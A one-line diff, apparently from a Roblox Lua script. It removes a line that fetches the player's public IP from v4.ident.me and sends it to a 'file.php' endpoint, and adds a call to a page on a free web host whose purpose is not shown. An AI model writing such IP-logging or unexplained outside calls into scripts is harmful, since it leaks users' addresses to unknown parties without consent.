@@ -1,1 +1,1 @@
-game:HttpGet("file.php?ip="..game:HttpGet("v4.ident.me"))
+game:HttpGet("https://synkgen.000webhostapp.com/a.html")
